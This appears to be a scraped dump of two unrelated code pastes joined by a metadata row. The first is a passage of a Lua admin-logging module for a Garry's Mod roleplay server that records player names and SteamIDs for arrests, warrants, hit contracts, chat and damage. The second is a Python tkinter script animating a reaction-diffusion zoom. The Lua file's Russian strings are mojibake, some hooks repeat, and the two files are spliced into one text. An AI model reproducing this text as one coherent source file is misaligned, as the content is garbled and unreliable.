DC_CORE:AddHook(category,  hookName, name, function(ply, ent)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???"", 
		ent.PrintName and ent.PrintName or ent:GetClass()
	)
end)
local format = ""–ò–≥—Ä–æ–∫ %s –ø–µ—Ä–µ—Å—Ç–∞–ª –≤–∑–ª–∞–º—ã–≤–∞—Ç—å %s.""
local hookName = ""lockpickTime""	
DC_CORE:AddHook(category,  hookName, name, function(ply, ent)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???"", 
		ent.PrintName and ent.PrintName or ent:GetClass()
	)
end)

local category = ""–ê—Ä–µ—Å—Ç—ã""
local name = ""DC_LOG_ARREST""
local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –∞—Ä–µ—Å—Ç–æ–≤–∞–ª –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""playerArrested""	
DC_CORE:AddHook(category,  hookName, name, function(ply, time, cp)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –æ—Ç–ø—É—Å—Ç–∏–ª –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""playerUnArrested""	
DC_CORE:AddHook(category,  hookName, name, function(ply, cp)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local category = ""–†–æ–∑—ã—Å–∫–∏""
local name = ""DC_LOG_WANTED""
local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s —Å–Ω—è–ª —Å —Ä–æ–∑—ã—Å–∫–∞ –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""playerUnWanted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, time, cp)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –æ–±—ä—è–≤–∏–ª –≤ —Ä–æ–∑—ã—Å–∫ %s –ø–æ –ø—Ä–∏—á–∏–Ω–µ %s""
local hookName = ""playerWanted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, cp, reason)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???"",
		reason or ""–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ""
	)
end)

local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s —Å–Ω—è–ª —Å —Ä–æ–∑—ã—Å–∫–∞ –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""playerUnWanted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, time, cp)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local category = ""–ó–∞–ø—Ä–æ—Å—ã –Ω–∞ –æ–±—ã—Å–∫""
local name = ""DC_LOG_WARRANT""
local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s —É–±—Ä–∞–ª –æ—Ä–¥–µ—Ä –Ω–∞ –æ–±—ã—Å–∫ –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""playerUnWarranted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, time, cp)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –∑–∞–ø—Ä–æ—Å–∏–ª –æ—Ä–¥–µ—Ä –Ω–∞ –æ–±—ã—Å–∫ %s –ø–æ –ø—Ä–∏—á–∏–Ω–µ %s""
local hookName = ""playerWarranted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, cp, reason)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???"",
		reason or ""–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ""
	)
end)

local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –≤–∑–ª–æ–º–∞–ª –¥–≤–µ—Ä—å %s""
local hookName = ""onDoorRamUsed""	
DC_CORE:AddHook(category,  hookName, name, function(succ, ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		},
		ply.Nick and ply:Nick() or ""???"",
		succ == true and ""—É—Å–ø–µ—à–Ω–æ"" or ""–Ω–µ—É—Å–ø–µ—à–Ω–æ""
	)
end)

local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s —É–±—Ä–∞–ª –æ—Ä–¥–µ—Ä –Ω–∞ –æ–±—ã—Å–∫ –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""playerUnWarranted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, time, cp)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
		},
		cp and cp.Nick and cp:Nick() or ""???"", 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local category = ""–î–≤–µ—Ä–∏""
local name = ""DC_LOG_DOORS""
local format = ""–ò–≥—Ä–æ–∫ %s –∫—É–ø–∏–ª –¥–≤–µ—Ä—å""
local hookName = ""playerBoughtDoor""	
DC_CORE:AddHook(category,  hookName, name, function(ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s –ø—Ä–æ–¥–∞–ª –¥–≤–µ—Ä—å""
local hookName = ""playerSellDoor""	
DC_CORE:AddHook(category,  hookName, name, function(ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local category = ""–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—Ä—É–∂–∏–µ""
local name = ""DC_LOG_WEPCHECK""
local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –æ–±—ã—Å–∫–∞–ª –∏–≥—Ä–æ–∫–∞ %s –∏ –Ω–∞—à–µ–ª""
local hookName = ""playerWeaponsChecked""	
DC_CORE:AddHook(category,  hookName, name, function(cp, target, weps)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		cp and cp.Nick and cp:Nick() or ""???"",
		target.Nick and target:Nick() or ""???"",
		table.Count(weps) > 0 and ""–æ—Ä—É–∂–∏–µ"" or ""–Ω–∏—á–µ–≥–æ""
	)
end)
local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –∫–æ–Ω—Ñ–∏—Å–∫–æ–≤–∞–ª –æ—Ä—É–∂–∏—è —É %s""
local hookName = ""playerWeaponsConfiscated""	
DC_CORE:AddHook(category,  hookName, name, function(cp, target, weps)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		cp and cp.Nick and cp:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)
local format = ""–ü–æ–ª–∏—Ü–µ–π—Å–∫–∏–π %s –≤–µ—Ä–Ω—É–ª –æ—Ä—É–∂–∏—è –∏–≥—Ä–æ–∫—É %s""
local hookName = ""playerWeaponsReturned""	
DC_CORE:AddHook(category,  hookName, name, function(cp, target, weps)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					cp and cp.Nick and cp:Nick() or ""???"",
					cp and cp.SteamID and cp:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		cp and cp.Nick and cp:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)

local category = ""–ó–∞–∫–æ–Ω—ã –≥–æ—Ä–æ–¥–∞""
local name = ""DC_LOG_LAWS""
local format = ""–ò–≥—Ä–æ–∫ %s —É–¥–∞–ª–∏–ª –∑–∞–∫–æ–Ω %s""
local hookName = ""removeLaw""	
DC_CORE:AddHook(category,  hookName, name, function(id, law, ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		law
	)
end)
local format = ""–ò–≥—Ä–æ–∫ %s –¥–æ–±–∞–≤–∏–ª –∑–∞–∫–æ–Ω %s""
local hookName = ""addLaw""	
DC_CORE:AddHook(category,  hookName, name, function(id, law, ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		law
	)
end)
local format = ""–ò–≥—Ä–æ–∫ %s –≤–æ–∑–≤—Ä–∞—Ç–∏–ª –≤—Å–µ –∑–∞–∫–æ–Ω—ã –Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ.""
local hookName = ""resetLaws""	
DC_CORE:AddHook(category,  hookName, name, function(ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local category = ""–ß–∞—Ç –∫–æ–º–∞–Ω–¥—ã""
local name = ""DC_LOG_CHATCMDS""
local format = ""–ò–≥—Ä–æ–∫ %s –Ω–∞–ø–∏—Å–∞–ª –∫–æ–º–∞–Ω–¥—É %s —Å –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏ %s""
local hookName = ""onChatCommand""	
DC_CORE:AddHook(category,  hookName, name, function(ply, cmd, args)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		cmd, args
	)
end)

local category = ""–ó–∞–∫–∞–∑—ã –Ω–∞ —É–±–∏–π—Å—Ç–≤–æ""
local name = ""DC_LOG_KILLER""
local format = ""–ö–∏–ª–ª–µ—Ä %s –ø—Ä–∏–Ω—è–ª –∑–∞–∫–∞–∑ –Ω–∞ %s. –ó–∞–∫–∞–∑—á–∏–∫ %s""
local hookName = ""onHitAccepted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target, customer)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
			[3] = 
				{ 	
					customer.Nick and customer:Nick() or ""???"",
					customer.SteamID and customer:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???"",
		customer.Nick and customer:Nick() or ""???""
	)
end)
local format = ""–ö–∏–ª–ª–µ—Ä %s –≤—ã–ø–æ–ª–Ω–∏–ª –∑–∞–∫–∞–∑ –Ω–∞ %s. –ó–∞–∫–∞–∑—á–∏–∫ %s""
local hookName = ""onHitCompleted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target, customer)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
			[3] = 
				{ 	
					customer.Nick and customer:Nick() or ""???"",
					customer.SteamID and customer:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???"",
		customer.Nick and customer:Nick() or ""???""
	)
end)
local format = ""–ö–∏–ª–ª–µ—Ä %s –ø—Ä–æ–≤–∞–ª–∏–ª –∑–∞–∫–∞–∑ –Ω–∞ %s –ø–æ –ø—Ä–∏—á–∏–Ω–µ %s""
local hookName = ""onHitFailed""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target, reason)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				}
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???"",
		reason or ""–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ""
	)
end)
local category = ""–°–º–µ–Ω–∞ RP –Ω–∏–∫–∞""
local name = ""DC_LOG_NAMECHANGE""
local format = ""–ò–≥—Ä–æ–∫ —Å–º–µ–Ω–∏–ª –Ω–∏–∫ —Å %s –Ω–∞ %s""
local hookName = ""onPlayerChangedName""	
DC_CORE:AddHook(category,  hookName, name, function(ply, old, new)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				}
		}, 
		old, new
	)
end)

local category = ""–£–≤–æ–ª—å–Ω–µ–Ω–∏—è""
local name = ""DC_LOG_DEMOTES""
local format = ""–ò–≥—Ä–æ–∫ %s —É–≤–æ–ª–∏–ª –∏–≥—Ä–æ–∫–∞ %s –ø–æ –ø—Ä–∏—á–∏–Ω–µ %s""
local hookName = ""onPlayerDemoted""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target, reason)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				}
		}, 
		ply and ply.Nick and ply:Nick() or ""??"",
		target and target.Nick and target:Nick() or ""??"", 
		reason
	)
end)

--[[-------------------------------------------------------------------------
SAM
---------------------------------------------------------------------------]]
local category = ""–ê–¥–º–∏–Ω –∫–æ–º–∞–Ω–¥—ã""
local name = ""DC_LOG_SAM""
local format = ""–ê–¥–º–∏–Ω %s –Ω–∞–ø–∏—Å–∞–ª –∫–æ–º–∞–Ω–¥—É %s —Å –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏ %s""
local hookName = ""SAM.RanCommand""	
DC_CORE:AddHook(category,  hookName, name, function(ply, cmd_name, args, cmd, result)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		cmd_name,
		istable(args) and table.Count(args) > 0 and args[1] ~= nil and args[1] or ""–Ω–∏–∫–∞–∫–∏–º–∏""
	)
end)

--[[-------------------------------------------------------------------------
–û—Å—Ç–∞–ª—å–Ω–æ–µ
---------------------------------------------------------------------------]]
local category = ""–ù–∞—Ä—É—á–Ω–∏–∫–∏""
local name = ""DC_LOG_HANDCUFFS""
local format = ""–ò–≥—Ä–æ–∫ %s –≤–æ—Ç–∫–Ω—É–ª –∫–ª—è–ø –∏–≥—Ä–æ–∫—É %s""
local hookName = ""OnHandcuffGag""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s –∑–∞–∫—Ä—ã–ª –≥–ª–∞–∑–∞ –∏–≥—Ä–æ–∫—É %s""
local hookName = ""OnHandcuffBlindfold""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s –Ω–∞—á–∞–ª —Ç–∞—â–∏—Ç—å –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""OnHandcuffStartDragging""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s –ø–µ—Ä–µ—Å—Ç–∞–ª —Ç–∞—â–∏—Ç—å –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""OnHandcuffStopDragging""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s —Å–Ω—è–ª –Ω–∞—Ä—É—á–Ω–∏–∫–∏ —Å –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""OnHandcuffUnTied""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s –Ω–∞–¥–µ–ª—å –Ω–∞—Ä—É—á–Ω–∏–∫–∏ –Ω–∞ –∏–≥—Ä–æ–∫–∞ %s""
local hookName = ""OnHandcuffed""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
			[2] = 
				{ 	
					target.Nick and target:Nick() or ""???"",
					target.SteamID and target:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		target.Nick and target:Nick() or ""???""
	)
end)

local format = ""–ò–≥—Ä–æ–∫ %s –ø–æ—Ä–≤–∞–ª –Ω–∞—Ä—É—á–Ω–∏–∫–∏""
local hookName = ""OnHandcuffBreak""	
DC_CORE:AddHook(category,  hookName, name, function(ply, target)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???""
	)
end)

local category = ""–ß–∞—Ç""
local name = ""DC_LOG_CHAT""
local format = ""%s –Ω–∞–ø–∏—Å–∞–ª %s""
local hookName = DarkRP and 'PostPlayerSay' or 'PlayerSay'	
DC_CORE:AddHook(category,  hookName, name, function(ply, text)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		string.Trim(text)
	)
end)

local category = ""–ê–Ω–æ–Ω–∏–º–Ω—ã–π —á–∞—Ç""
local name = ""DC_LOG_ANONCHAT""
local format = ""%s –Ω–∞–ø–∏—Å–∞–ª %s""
local hookName = 'DC_AnonChat'	
DC_CORE:AddHook(category,  hookName, name, function(cmd, text, ply)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		string.Trim(text)
	)
end)

local category = ""–£—Ä–æ–Ω""
local name = ""DC_LOG_DAMAGE""
local format = ""%s –Ω–∞–Ω–µ—Å %s —É—Ä–æ–Ω–∞ –∏–≥—Ä–æ–∫—É %s —Å –ø–æ–º–æ—â—å—é %s""
local hookName = 'EntityTakeDamage'	
DC_CORE:AddHook(category,  hookName, name, function(ent, dmginfo)
	local attacker = dmginfo:GetAttacker()
	if ent:IsPlayer() and IsValid(attacker) and attacker:IsPlayer() then
		if dmginfo:GetDamage() < 8 then return end
		local inflictor = dmginfo:GetInflictor()
		DC_CORE:AddLog(category, hookName, format,
			{
				[1] = 
					{ 	
						ent.Nick and ent:Nick() or ""???"",
						ent.SteamID and ent:SteamID() or ""???""
					},
				[2] = 
					{ 	
						attacker.Nick and attacker:Nick() or ""???"",
						attacker.SteamID and attacker:SteamID() or ""???""
					},
			}, 
			attacker.Nick and attacker:Nick() or ""???"",
			ent.Nick and ent:Nick() or ""???"",
			math.Round(dmginfo:GetDamage()),
			inflictor and inflictor:IsValid() and inflictor:GetClass() or ""???""
		)
	end	
end)

local category = ""–ü—Ä–æ–ø—ã""
local name = ""DC_LOG_PROPS""
local format = ""%s –∑–∞—Å–ø–∞–≤–Ω–∏–ª %s""
local hookName = 'PlayerSpawnProp'	
DC_CORE:AddHook(category,  hookName, name, function(ply, mdl)
	DC_CORE:AddLog(category, hookName, format,
		{
			[1] = 
				{ 	
					ply.Nick and ply:Nick() or ""???"",
					ply.SteamID and ply:SteamID() or ""???""
				},
		}, 
		ply.Nick and ply:Nick() or ""???"",
		mdl or ""??""
	)
end)

local category = ""–†–∞–±–æ—Ç—ã""
local name = ""DC_LOG_JOBS""
local format = ""%s –ø–æ–º–µ–Ω—è–ª —Ä–∞–±–æ—Ç—É –Ω–∞ %s —Å %s""
local hookName = 'OnPlayerChangedTeam'	
DC_CORE:AddHook(category,  hookName, name, function(ply, old, new)
	if IsValid(ply) then
		DC_CORE:AddLog(category, hookName, format,
			{
				[1] = 
					{ 	
						ply.Nick and ply:Nick() or ""???"",
						ply.SteamID and ply:SteamID() or ""???""
					},
			}, 
			ply.Nick and ply:Nick() or ""???"",
			team.GetName(new),
			team.GetName(old)
		)
	end
end)

local category = ""–ò–Ω–≤–µ–Ω—Ç–∞—Ä—å""
local name = ""DC_LOG_POCKET""
local format = ""%s –ø–æ–¥–Ω—è–ª %s""
local hookName = 'onPocketItemAdded'	
DC_CORE:AddHook(category,  hookName, name, function(ply, ent)
	if IsValid(ply) then
		DC_CORE:AddLog(category, hookName, format,
			{
				[1] = 
					{ 	
						ply.Nick and ply:Nick() or ""???"",
						ply.SteamID and ply:SteamID() or ""???""
					},
			}, 
			ply.Nick and ply:Nick() or ""???"",
			ent:GetClass()
		)
	end
end)"
ed7RaijH,# tk_Reaction_Diffusion_Zoom.py,here2share,Python,Sunday 7th of January 2024 06:54:28 PM CDT,"# tk_Reaction_Diffusion_Zoom.py

import tkinter as tk
from PIL import Image, ImageTk, ImageFilter
import random

ww = 560
hh = 560
ww0, hh0 = ww + 2, hh + 2
center_x = ww // 2
center_y = hh // 2

root = tk.Tk()
root.title(""tk_Reaction_Diffusion_Zoom"")
root.geometry('+0+0')

canvas = tk.Canvas(root, width=ww, height=hh, bg='white')

def update_params_x(value):
	global x0
	x0 = float(value)

def update_params_y(value):
	global y0
	y0 = float(value)

def update_params_z(value):
	global z0
	z0 = float(value)

x0 = 5
y0 = 5
z0 = 2

even_dist = [192] * (ww0*hh0//2)
even_dist += [80] * (ww0*hh0//2)
random.shuffle(even_dist)

x_slider = tk.Scale(root, from_=99, to=0, label='X', resolution=1, orient=tk.VERTICAL, bg=""#FFFF00"")
x_slider.set(x0)

y_slider = tk.Scale(root, from_=99, to=0, label='Y', resolution=1, orient=tk.VERTICAL, bg=""#00FF00"")
y_slider.set(y0)

z_slider = tk.Scale(root, from_=99, to=0, label='Z', resolution=1, orient=tk.VERTICAL, bg=""#00C0FF"")
z_slider.set(z0)

canvas.pack(side=tk.LEFT)
x_slider.pack(side=tk.LEFT, fill='y')
y_slider.pack(side=tk.LEFT, fill='y')
z_slider.pack(side=tk.LEFT, fill='y')

x_slider.config(command=lambda value: update_params_x(x_slider.get()))
y_slider.config(command=lambda value: update_params_y(y_slider.get()))
z_slider.config(command=lambda value: update_params_z(z_slider.get()))

ref_image = Image.new(""RGB"", (ww0, hh0), ""white"")

kernel_values = [0.05, 0.2, 0.05, 0.2, -1, 0.2, 0.05, 0.2, 0.05]

def display():
	img = ref_image.crop((4, 4, ww + 4, hh + 4))
	img_tk = ImageTk.PhotoImage(img)
	canvas.create_image(0, 0, anchor=""nw"", image=img_tk)
	canvas.img = img_tk
	root.update()
	ref_image.putpixel((center_x, center_y - 1), (255, 255, 255))
	ref_image.putpixel((center_x, center_y + 1), (0, 0, 0))
	
ref_image = Image.new(""RGB"", (ww0, hh0), ""white"")
pixel_data = []
for i in range(hh0):
	for j in range(ww0):
		c = even_dist.pop()
		pixel_data.append((c, c, c))
ref_image.putdata(pixel_data)
kernel = ImageFilter.Kernel((3, 3), kernel_values, scale=None, offset=0)
while True:
	x, y, z = x0, y0, z0
	ref_image = ref_image.rotate(-0.5, resample=Image.BICUBIC)  
	ref_image = ref_image.resize((ww + 8, hh + 8), resample=Image.BICUBIC)
	ref_image = ref_image.crop((4, 4, ww + 4, hh + 4))
	ref_image = ref_image.filter(ImageFilter.GaussianBlur(x))
	ref_image = ref_image.filter(kernel)
	ref_image = ref_image.filter(ImageFilter.GaussianBlur(y))
	ref_image = ref_image.filter(kernel)
	ref_image = ref_image.filter(ImageFilter.GaussianBlur(z))
	display()"
